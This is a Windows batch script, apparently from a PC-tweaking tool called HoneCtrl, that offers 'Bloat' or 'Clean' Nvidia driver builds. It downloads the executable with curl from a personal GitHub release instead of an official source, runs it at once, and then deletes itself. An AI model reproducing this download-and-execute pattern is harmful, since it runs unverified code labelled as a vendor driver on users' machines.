@echo off
title Downloading Nvidia driver...
echo The drivers are 528 Mb to 717 Mb, so this will take a moment to download. (553,751,625 or 752,433,782 bytes)
echo PLEASE, do NOT open HoneCtrl until the driver installation is done.
echo.
:start
set /p choice=Do you need shadowplay and other components of the driver? Y or N?: 
if /i "%choice%" == "y" (
  curl -g -L -# -o "C:\Hone\Drivers\NvidiaHone.exe" "https://github.com/Kalip276/file/releases/download/gwgwg/546.17_Bloat.exe"
) else if /i "%choice%" == "n" (
  curl -g -L -# -o "C:\Hone\Drivers\NvidiaHone.exe" "https://github.com/Kalip276/file/releases/download/gwgwg/546.17_Clean.exe"
) else (
  goto start
)

C:\Hone\Drivers\NvidiaHone.exe

goto 2>nul & del "%~f0"
